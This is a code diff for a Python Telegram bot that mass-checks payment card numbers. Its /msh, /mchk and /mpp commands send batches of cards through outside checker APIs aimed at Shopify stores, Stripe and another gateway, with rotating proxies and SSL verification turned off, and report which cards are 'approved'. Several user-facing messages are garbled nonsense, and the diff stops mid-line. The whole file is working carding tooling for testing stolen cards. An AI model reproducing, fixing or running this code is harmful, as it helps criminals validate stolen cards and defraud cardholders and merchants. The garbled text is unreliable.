@@ -108,13 +108,21 @@ async def extract_cards_from_update(update: Update, bot) -> list | None:
 
     # ── Method 2: Direct file sent (user sent file, /msh is caption) ──
     if msg.document and msg.document.file_id:
-        text = await _download_file(bot, msg.document.file_id)
+        text = await _download_file_cards(bot, msg.document.file_id)
         if text:
             return parse_cards(text)
 
     # ── Method 3: Direct text after command ──
-    if update.args:
-        return parse_cards(" ".join(context.args))
+    if msg.text and msg.text.strip():
+        # Remove command from text
+        text = msg.text
+        # If it's a command, extract args
+        if text.startswith('/'):
+            parts = text.split(maxsplit=1)
+            if len(parts) > 1:
+                return parse_cards(parts[1])
+        else:
+            return parse_cards(text)
 
     return None
 
@@ -164,12 +172,25 @@ async def check_single_shopify_card(session: aiohttp.ClientSession, card: str, s
         if proxy: params["proxy"] = proxy
         try:
             async with session.get(SH_API, params=params) as resp:
-                try: data = await resp.json(content_type=None)
-                except Exception: data = {"Response": await resp.text(), "Status": "false", "Gateway": "N/A", "Price": "N/A", "CC": card}
-                if not isinstance(data, dict): data = {"Response": str(data), "Status": "false", "Gateway": "N/A", "Price": "N/A", "CC": card}
-                return {"card": card, "gateway": data.get("Gateway", "N/A"), "price": data.get("Price", "N/A"), "response": str(data.get("Response", "ERROR"), "status": str(data.get("Status", "false")).lower(), "cc_used": data.get("CC", card), "error": None}
-        except asyncio.TimeoutError: return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
-        except Exception as e: return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}
+                try: 
+                    data = await resp.json(content_type=None)
+                except Exception: 
+                    data = {"Response": await resp.text(), "Status": "false", "Gateway": "N/A", "Price": "N/A", "CC": card}
+                if not isinstance(data, dict): 
+                    data = {"Response": str(data), "Status": "false", "Gateway": "N/A", "Price": "N/A", "CC": card}
+                return {
+                    "card": card, 
+                    "gateway": data.get("Gateway", "N/A"), 
+                    "price": data.get("Price", "N/A"), 
+                    "response": str(data.get("Response", "ERROR")), 
+                    "status": str(data.get("Status", "false")).lower(), 
+                    "cc_used": data.get("CC", card), 
+                    "error": None
+                }
+        except asyncio.TimeoutError: 
+            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
+        except Exception as e: 
+            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}
 
 async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.bot_data.get("msh_on", True):
@@ -180,7 +201,7 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cards = await extract_cards_from_update(update, context.bot)
     if not cards:
         await update.message.reply_text(
-            "⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱ ᴡᴇɴᴅ ᴡɪꜴʟᴇ ᴡᴏʟ ᴡᴏʟꜰ, ᴏʀ ʀᴇᴘʟʏ ᴀ ꜰꜱᴇ ᴀ ꜰᴇɪᴄᴇ ᴡɪꜱꜱ\n\n"
+            "⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱ ᴡᴇɴᴅ ᴡɪᴴʟᴇ ᴡᴏʟ ᴡᴏʟꜰ, ᴏʀ ʀᴇᴘʟʏ ᴀ ꜰꜱᴇ ᴀ ꜰᴇɪᴄᴇ ᴡɪꜱꜱ\n\n"
             "• Sᴇɴᴅ ᴛɪʟᴇ ᴀꜱ ꜱᴇ ᴀꜱᴇ ᴀꜱᴇ ᴡɪꜱꜱ\n"
             "• Rᴇᴘʟʏ ᴛᴏ ᴛᴏꜱ ᴛᴏꜱ ᴡᴏʟꜰ, ᴛᴏᴛᴏꜱ /msh ᴀꜱ ᴀꜱ ꜱ ᴛᴏᴡᴏꜰ\n"
             "• Oʀ ᴜᴇᴄᴇᴇ ᴄᴀʀᴅꜱ ᴡᴏʟꜰ ᴡᴇᴏᴅ ᴛᴏꜱ\n\n"
@@ -193,25 +214,40 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀ ʀᴜɴ. Yᴏᴜꜱ ꜱᴇ ꜱᴇɴᴛ: {len(cards)}", parse_mode="HTML")
         return
 
-    if not deduct_credits(context, update.effective_user.id, len(cards)):
-        msg = await update.message.reply_text(f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {context.bot_data.get('user_data', {}).get(str(update.effective_user.id, {}).get('credits', 0)}.", parse_mode="HTML")
+    if not await deduct_credits(context, update.effective_user.id, len(cards)):
+        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
+        await update.message.reply_text(
+            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", 
+            parse_mode="HTML"
+        )
         return
 
     rotator = ProxyRotator(PROXIES)
     sites = SITES if SITES else ["https://powerbuild.store"]
     proxy_info = f"Pʀᴏxɪᴇꜱꜱ ➺ {rotator.count()}" + (" (Nᴏɴᴇ)" if not PROXIES else "")
     msg = await update.message.reply_text(
-        f"🦇 {SH_GATE_NAME}\n━━━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n{proxy_info}\n🌐 Sɪᴛᴇꜱꜱ ➺ {len(sites)}\n━━━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱꜱ...", parse_mode="HTML")
+        f"🦇 {SH_GATE_NAME}\n━━━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n{proxy_info}\n🌐 Sɪᴛᴇꜱꜱ ➺ {len(sites)}\n━━━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱ...", 
+        parse_mode="HTML"
+    )
 
     bin_task = get_bin_info(cards[0][:6])
     semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
     start_time = time.time()
 
-    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=SH_API_TIMEOUT), connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)) as session:
-        results = await asyncio.gather(*[check_single_shopify_card(session, c, sites[i % len(sites)], rotator.next(), semaphore) for i, c in enumerate(cards)], return_exceptions=True)
+    async with aiohttp.ClientSession(
+        timeout=aiohttp.ClientTimeout(total=SH_API_TIMEOUT), 
+        connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
+    ) as session:
+        tasks = [
+            check_single_shopify_card(session, c, sites[i % len(sites)], rotator.next(), semaphore) 
+            for i, c in enumerate(cards)
+        ]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
 
-    try: bin_data = await bin_task if asyncio.iscoroutine(bin_task) else bin_task
-    except Exception: bin_data = {"error": True}
+    try: 
+        bin_data = await bin_task if asyncio.iscoroutine(bin_task) else bin_task
+    except Exception: 
+        bin_data = {"error": True}
 
     parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false"} for r in results]
     approved_list = [r for r in parsed if not r.get("error") and (r["status"] == "true" or "approved" in r["response"].lower())]
@@ -220,8 +256,11 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     u = update.effective_user.username or update.effective_user.first_name or "User"
     bin_txt = "N/A"
     if bin_data and not bin_data.get("error"):
-        s = str(bin_data.get("scheme", "N/A")).upper(); t = str(bin_data.get("type", "N/A")).upper(); b = bin_data.get("bank", "N/A")
-        country = str(bin_data.get("country", "N/A")).upper(); flag = bin_data.get("country_emoji", "")
+        s = str(bin_data.get("scheme", "N/A")).upper()
+        t = str(bin_data.get("type", "N/A")).upper()
+        b = bin_data.get("bank", "N/A")
+        country = str(bin_data.get("country", "N/A")).upper()
+        flag = bin_data.get("country_emoji", "")
         bin_txt = f"{s} - {t} - {b}"
 
     lines = [
@@ -229,7 +268,7 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Tᴏᴛᴛᴀʟ ➺ {len(parsed)}", f"✅ Aᴘᴘʀᴏᴠᴏᴠᴇᴅ ➺ {len(approved_list)}",
         f"❌ Dᴇᴄʟɪɴᴇᴅᴅ ➺ {len(parsed) - len(approved_list) - len(error_list)}",
         f"⚠️ Eʀʀᴏʀꜱꜱꜱ ➺ {len(error_list)}",
-        f"⏱️ Tɪᴍᴇ ➺ {time.time() - start_time:.2f}s", "━━━━━━━━━━━━━━━━━━━━",
+        f"⏱️ Tɪᴍᴇ ➺ {time.time() - start_time:.2f}s", "━━━━━━━━━━━━━━━━━━",
     ]
 
     approved_lines = []
@@ -240,15 +279,24 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
             approved_lines.append(f"  {i}. <code>{masked}</code>\n     Gᴀᴛᴇᴡᴀʏ ➺ {r['gateway']}\n     Pʀɪᴄᴄᴇ ➺ ${r['price']}\n     Rᴇꜱꜱᴘ ➺ {r['response'][:50]}")
 
-    footer_lines = [f"\n━━━━━━━━━━━━━━━━━━", f"🏦 Bɪɴ ➺ {bin_txt}", "━━━━━━━━━━━━━━━━━━", f"🦇 Uꜱᴇʀ ➺ {u}"]
+    footer_lines = [f"\n━━━━━━━━━━━━━━━━", f"🏦 Bɪɴ ➺ {bin_txt}", "━━━━━━━━━━━━━━━━", f"🦇 Uꜱᴇʀ ➺ {u}"]
     full_text = "\n".join(lines + approved_lines + footer_lines)
 
     if len(full_text) <= 4000:
-        try: await msg.edit_text(full_text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
-        except Exception: await msg.edit_text(full_text[:4000], parse_mode="HTML", reply_markup=kb_result())
+        try: 
+            await msg.edit_text(full_text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
+        except Exception: 
+            await msg.edit_text(full_text[:4000], parse_mode="HTML", reply_markup=kb_result())
     else:
-        try: await msg.edit_text("\n".join(lines) + "\n\n📜 Fᴜʟʟ ʀᴇꜱꜱᴛ sᴇɴᴛ ʙᴇʟᴏᴡ ⬇️" + "\n".join(footer_lines), parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
-        except Exception: pass
+        try: 
+            await msg.edit_text(
+                "\n".join(lines) + "\n\n📜 Fᴜʟʟ ʀᴇꜱꜱᴛ sᴇɴᴛ ʙᴇʟᴏᴡ ⬇️" + "\n".join(footer_lines), 
+                parse_mode="HTML", 
+                reply_markup=kb_result(), 
+                disable_web_page_preview=True
+            )
+        except Exception: 
+            pass
         for i in range(0, len(approved_list), 15):
             chunk = approved_list[i:i+15]
             chunk_lines = [f"✅ Aᴘᴘʀᴏᴠᴇᴅ ({i+1}-{min(i+15, len(approved_list))}/{len(approved_list)})"]
@@ -256,8 +304,14 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for j, r in enumerate(chunk, i+1):
                 masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
                 chunk_lines.append(f"  {j}. <code>{masked}</code>\n     Gᴀᴛᴇᴡᴀʏ ➺ {r['gateway']}\n     Pʀɪᴄᴄᴇ ➺ ${r['price']}\n     Rᴇꜱᴘ ➺ {r['response'][:50]}")
-            try: await context.bot.send_message(chat_id=update.effective_chat.id, text="\n".join(chunk_lines)[:4000], parse_mode="HTML")
-            except Exception: pass
+            try: 
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id, 
+                    text="\n".join(chunk_lines)[:4000], 
+                    parse_mode="HTML"
+                )
+            except Exception: 
+                pass
             await asyncio.sleep(0.3)
 
 
@@ -269,19 +323,32 @@ async def check_single_stripe_card(session: aiohttp.ClientSession, card: str, se
         api_url = f"{CHK_API_URL}?cc={card}&site={CHK_SITE}"
         try:
             async with session.get(api_url) as resp:
-                try: data = await resp.json(content_type=None)
-                except Exception: data = {"response": await resp.text()}
-                if not isinstance(data, dict): data = {"response": str(data)}
+                try: 
+                    data = await resp.json(content_type=None)
+                except Exception: 
+                    data = {"response": await resp.text()}
+                if not isinstance(data, dict): 
+                    data = {"response": str(data)}
                 raw_response = str(data.get("response", "NO RESPONSE"))
                 raw_response = re.sub(r'https?://\S+', '', raw_response).strip()
-                if not raw_response: raw_response = "NO RESPONSE"
-                return {"card": card, "cc_used": card, "response": raw_response, "status": "true" if "approved" in raw_response.lower() else "false", "error": None}
-        except asyncio.TimeoutError: return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
-        except Exception as e: return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}
+                if not raw_response: 
+                    raw_response = "NO RESPONSE"
+                return {
+                    "card": card, 
+                    "cc_used": card, 
+                    "response": raw_response, 
+                    "status": "true" if "approved" in raw_response.lower() else "false", 
+                    "error": None
+                }
+        except asyncio.TimeoutError: 
+            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
+        except Exception as e: 
+            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}
 
 async def cmd_mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.bot_data.get("mchk_on", True):
-        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML"); return
+        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
+        return
 
     # ── Extract cards from text, reply, or file ──
     cards = await extract_cards_from_update(update, context.bot)
@@ -297,26 +364,40 @@ async def cmd_mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if len(cards) > MAX_CARDS:
-        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀʀᴜɴ. Yᴏᴜᴜ ꜱᴇ ꜱᴇ: {len(cards)}", parse_mode="HTML")
+        await update.message.reply_text(
+            f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀʀᴜɴ. Yᴏᴜᴜ ꜱᴇ ꜱᴇ: {len(cards)}", 
+            parse_mode="HTML"
+        )
         return
 
-    if not deduct_credits(context, update.effective_user.id, len(cards)):
-        msg = await update.message.reply_text(f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {context.bot_data.get('user_data', {}).get(str(update.effective_user.id, {}).get('credits', 0)}.", parse_mode="HTML")
+    if not await deduct_credits(context, update.effective_user.id, len(cards)):
+        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
+        await update.message.reply_text(
+            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", 
+            parse_mode="HTML"
+        )
         return
 
     msg = await update.message.reply_text(
-        f"🦇 STRIPE MASS 0$ 💳 🟢\n━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱ...", parse_mode="HTML"
+        f"🦇 STRIPE MASS 0$ 💳 🟢\n━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱ...", 
+        parse_mode="HTML"
     )
 
     bin_task = get_bin_info(cards[0][:6])
     semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
     start_time = time.time()
 
-    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=CHK_TIMEOUT), connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)) as session:
-        results = await asyncio.gather(*[check_single_stripe_card(session, c, semaphore) for c in cards], return_exceptions=True)
+    async with aiohttp.ClientSession(
+        timeout=aiohttp.ClientTimeout(total=CHK_TIMEOUT), 
+        connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
+    ) as session:
+        tasks = [check_single_stripe_card(session, c, semaphore) for c in cards]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
 
-    try: bin_data = await bin_task if asyncio.iscoroutine(bin_task) else bin_task
-    except Exception: bin_data = {"error": True}
+    try: 
+        bin_data = await bin_task if asyncio.iscoroutine(bin_task) else bin_task
+    except Exception: 
+        bin_data = {"error": True}
 
     parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false"} for r in results]
     approved_list = [r for r in parsed if not r.get("error") and (r["status"] == "true" or "approved" in r["response"].lower())]
@@ -326,8 +407,10 @@ async def cmd_mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     plan_ui = get_user_plan_ui(context, update.effective_user.id)
     bin_txt = "N/A"
     if bin_data and not bin_data.get("error"):
-        s = str(bin_data.get("scheme", "N/A")).upper(); b = bin_data.get("bank", "N/A")
-        country = str(bin_data.get("country", "N/A")).upper(); flag = bin_data.get("country_emoji", "")
+        s = str(bin_data.get("scheme", "N/A")).upper()
+        b = bin_data.get("bank", "N/A")
+        country = str(bin_data.get("country", "N/A")).upper()
+        flag = bin_data.get("country_emoji", "")
         bin_txt = f"{s} - {b} - {flag} {country}"
 
     lines = [
@@ -356,19 +439,37 @@ async def cmd_mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     full_text = "\n".join(lines + approved_lines + footer_lines)
 
     if len(full_text) <= 4000:
-        try: await msg.edit_text(full_text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
-        except Exception: await msg.edit_text(full_text[:4000], parse_mode="HTML", reply_markup=kb_result())
+        try: 
+            await msg.edit_text(full_text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
+        except Exception: 
+            await msg.edit_text(full_text[:4000], parse_mode="HTML", reply_markup=kb_result())
     else:
-        try: await msg.edit_text("\n".join(lines) + "\n\n📜 Fᴜʟʟ ʀᴇꜱꜱᴛ sᴇɴᴛ ʙᴇʟᴏᴡ ⬇️" + "\n".join(footer_lines), parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
-        except Exception: pass
+        try: 
+            await msg.edit_text(
+                "\n".join(lines) + "\n\n📜 Fᴜʟʟ ʀᴇꜱꜱᴛ sᴇɴᴛ ʙᴇʟᴏᴡ ⬇️" + "\n".join(footer_lines), 
+                parse_mode="HTML", 
+                reply_markup=kb_result(), 
+                disable_web_page_preview=True
+            )
+        except Exception: 
+            pass
         for i in range(0, len(approved_list), 15):
             chunk = approved_list[i:i+15]
-            chunk_lines = [f"✅ Aᴘᴘʀᴏᴠᴇᴅ ({i+1}-{min(i+15, len(approved_list))}/{len(approved_list)})", "━━━━━━━━━━━━━━━━━━"]
+            chunk_lines = [
+                f"✅ Aᴘᴘʀᴏᴠᴇᴅ ({i+1}-{min(i+15, len(approved_list))}/{len(approved_list)})", 
+                "━━━━━━━━━━━━━━━━━━"
+            ]
             for j, r in enumerate(chunk, i+1):
                 masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
                 chunk_lines.append(f"  {j}. <code>{masked}</code>\n     Rᴛᴡ ➺ {r['response'][:60]}")
-            try: await context.bot.send_message(chat_id=update.effective_chat.id, text="\n".join(chunk_lines)[:4000], parse_mode="HTML")
-            except Exception: pass
+            try: 
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id, 
+                    text="\n".join(chunk_lines)[:4000], 
+                    parse_mode="HTML"
+                )
+            except Exception: 
+                pass
             await asyncio.sleep(0.3)
 
 
@@ -380,18 +481,25 @@ async def check_single_pp_card(session: aiohttp.ClientSession, card: str, semaph
         api_url = PP_NEW_API.format(card=card)
         try:
             async with session.get(api_url) as resp:
-                try: data = await resp.json(content_type=None)
-                except Exception: data = {"status": "declined", "message": await resp.text()}
-                if not isinstance(data, dict): data = {"status": "declined", "message": str(data)}
+                try: 
+                    data = await resp.json(content_type=None)
+                except Exception: 
+                    data = {"status": "declined", "message": await resp.text()}
+                if not isinstance(data, dict): 
+                    data = {"status": "declined", "message": str(data)}
                 status = str(data.get("status", "declined")).lower()
                 code = str(data.get("code", ""))
-                message = str(data.get("message", "NO RESPONSE")
+                message = str(data.get("message", "NO RESPONSE"))
                 raw = message or code or "NO RESPONSE"
                 raw = re.sub(r'https?://\S+', '', raw).strip()
-                if not raw: raw = "NO RESPONSE"
+                if not raw: 
+                    raw = "NO RESPONSE"
                 return {
-                    "card": card, "cc_used": card, "response": raw,
-                    "status": "true" if status == "approved" else "false", "error": None,
+                    "card": card, 
+                    "cc_used": card, 
+                    "response": raw,
+                    "status": "true" if status == "approved" else "false", 
+                    "error": None,
                 }
         except asyncio.TimeoutError:
             return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
@@ -400,7 +508,8 @@ async def check_single_pp_card(session: aiohttp.ClientSession, card: str, semaph
 
 async def cmd_mpp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.bot_data.get("mpp_on", True):
-        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML"); return
+        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
+        return
 
     # ── Extract cards from text, reply, or file ──
     cards = await extract_cards_from_update(update, context.bot)
@@ -416,105 +525,32 @@ async def cmd_mpp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if len(cards) > MAX_CARDS:
-        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀʀᴜɴ. Yᴏᴜᴜᴇ ꜱᴇ: {len(cards)}", parse_mode="HTML")
+        await update.message.reply_text(
+            f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀʀᴜɴ. Yᴏᴜᴜᴇ ꜱᴇ: {len(cards)}", 
+            parse_mode="HTML"
+        )
         return
 
-    if not deduct_credits(context, update.effective_user.id, len(cards)):
-        msg = await update.message.reply_text(f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {context.bot_data.get('user_data', {}).get(str(update.effective_user.id, {}).get('credits', 0)}.", parse_mode="HTML")
+    if not await deduct_credits(context, update.effective_user.id, len(cards)):
+        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
+        await update.message.reply_text(
+            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", 
+            parse_mode="HTML"
+        )
         return
 
     msg = await update.message.reply_text(
-        f"🦇 {PP_GATE_NAME} 🛒 🟢\n━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱꜱ...", parse_mode="HTML"
+        f"🦇 {PP_GATE_NAME} 🛒 🟢\n━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱꜱ...", 
+        parse_mode="HTML"
     )
 
     bin_task = get_bin_info(cards[0][:6])
     semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
     start_time = time.time()
 
-    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=PP_TIMEOUT), connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)) as session:
-        results = await asyncio.gather(*[check_single_pp_card(session, c, semaphore) for c in cards], return_exceptions=True)
-
-    try: bin_data = await bin_task if asyncio.iscoroutine(bin_task) else bin_task
-    except Exception: bin_data = {"error": True}
-
-    parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false"} for r in results]
-    approved_list = [r for r in parsed if not r.get("error") and (r["status"] == "true" or "approved" in r["response"].lower())]
-    error_list = [r for r in parsed if r.get("error")]
-
-    username = update.effective_user.first_name or "User"
-    plan_ui = get_user_plan_ui(context, update.effective_user.id)
-    bin_txt, country, flag = "N/A", "N/A", ""
-    if bin_data and not bin_data.get("error"):
-        s = str(bin_data.get("scheme", "N/A")).upper(); t = str(bin_data.get("type", "N/A")).upper()
-        b = bin_data.get("bank", "N/A")
-        country = str(bin_data.get("country", "N/A")).upper(); flag = bin_data.get("country_emoji", "")
-        bin_txt = f"{s} - {t} - {b}"
-
-    lines = [
-        f"🦇 {PP_GATE_NAME} 🛒 🟢 ➛ Cᴏᴍᴘᴘᴛᴇᴅ",
-        "━━━━━━━━━━━━━━━━━━━━", f"📊 Tᴏᴛᴀʟ ➺ {len(parsed)}",
-        f"✅ Aᴘᴘʀᴏᴠᴇᴅ ➺ {len(approved_list)}",
-        f"❌ Dᴇᴄʟɪɴᴇᴅ ➺ {len(parsed) - len(approved_list) - len(error_list)}",
-        f"⚠️ Eʀʀᴏʀꜱꜱꜱ ➺ {len(error_list)}",
-        f"⏱️ Tɪᴍᴇ ➺ {time.time() - start_time:.2f}s",
-        "━━━━━━━━━━━━━━━━━━",
-    ]
-
-    approved_lines = []
-    if approved_list:
-        approved_lines.append(f"\n✅ Aᴘᴘʀᴏᴠᴇᴅ ({len(approved_list)})")
-        approved_lines.append("━━━━━━━━━━━━━━━━━━━━")
-        for i, r in enumerate(approved_list, 1):
-            masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
-            approved_lines.append(f"  {i}. <code>{masked}</code>\n     Rᴀᴡ ➺ {r['response'][:60]}")
-
-    footer_lines = [
-        "\n━━━━━━━━━━━━━━━━━━",
-        f"🏦 Iɴꜰᴏ ➺ {bin_txt} {flag} {country}",
-        "━━━━━━━━━━━━━━━━━━",
-        f"Uꜱᴇʀ ➺ {username} 👑 ({plan_ui})",
-        "Pʀᴏ ➺ Batman ⚡",
-    ]
-    full_text = "\n".join(lines + approved_lines + footer_lines)
-
-    if len(full_text) <= 4000:
-        try: await msg.edit_text(full_text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
-        except Exception: await msg.edit_text(full_text[:4000], parse_mode="HTML", reply_markup=kb_result())
-    else:
-        try:
-            await msg.edit_text(
-                "\n".join(lines) + "\n\n📜 Fᴜʟʟ ʀᴇꜱꜱᴛ sᴇɴᴛ ʙᴇʟᴏᴡ ⬇️" + "\n".join(footer_lines),
-                parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True,
-            )
-        except Exception:
-            pass
-        for i in range(0, len(approved_list), 15):
-            chunk = approved_list[i:i+15]
-            chunk_lines = [
-                f"✅ Aᴘᴘʀᴏᴠᴇᴅ ({i+1}-{min(i+15, len(approved_list))}/{len(approved_list)})"
-            ]
-            chunk_lines.append("━━━━━━━━━━━━━━━━━━")
-            for j, r in enumerate(chunk, i+1):
-                masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
-                chunk_lines.append(f"  {j}. <code>{masked}</code>\n     Rᴛᴡ ➺ {r['response'][:60]}")
-            try:
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id,
-                    text="\n".join(chunk_lines)[:4000], parse_mode="HTML",
-                )
-            except Exception:
-                pass
-            await asyncio.sleep(0.3)
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# EXPORT HANDLERS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-def get_msh_handler():
-    return CommandHandler("msh", cmd_msh)
-
-def get_mchk_handler():
-    return CommandHandler("mchk", cmd_mchk)
-
-def get_mpp_handler():
-    return CommandHandler("mpp", cmd_mpp)
+    async with aiohttp.ClientSession(
+        timeout=aiohttp.ClientTimeout(total=PP_TIMEOUT), 
+        connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
+    ) as session:
+        tasks = [check_single_pp_card(session, c, semaphore) for c in cards]
+        results = await asyncio.gather(*tasks, return
